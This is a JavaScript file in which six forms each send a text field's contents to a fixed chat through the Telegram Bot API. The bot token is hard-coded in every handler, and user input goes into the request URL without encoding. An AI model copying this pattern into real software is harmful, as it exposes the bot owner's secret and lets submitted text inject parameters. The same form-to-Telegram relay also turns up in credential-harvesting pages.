const send1 = document.querySelector('#send_form1');
const send2 = document.querySelector('#send_form2');
const send3 = document.querySelector('#send_form3');
const send4 = document.querySelector('#send_form4');
const send5 = document.querySelector('#send_form5');
const send6 = document.querySelector('#send_form6');


send1.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendOne').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendOne').value = '';

    console.log('message successfully')
})
send2.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendTwo').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendTwo').value = '';

    console.log('message successfully')
})
send3.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendThree').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendThree').value = '';

    console.log('message successfully')
})
send4.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendFour').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendFour').value = '';

    console.log('message successfully')
})
send5.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendFive').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendFive').value = '';

    console.log('message successfully')
})
send6.addEventListener("submit", (e)=>{
    e.preventDefault()

    var text1 = document.getElementById('sendSix').value;

    let my_text =`Result is:%0A<b>Text:</b> %0A<i>${text1}</i>`

    var token = '1566809566:AAFvZ6liPTAWZGyA_we3Gvd0zzzJRgktAPA'
    var chat_id = -1001402174525

    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    document.getElementById('sendSix').value = '';

    console.log('message successfully')
})
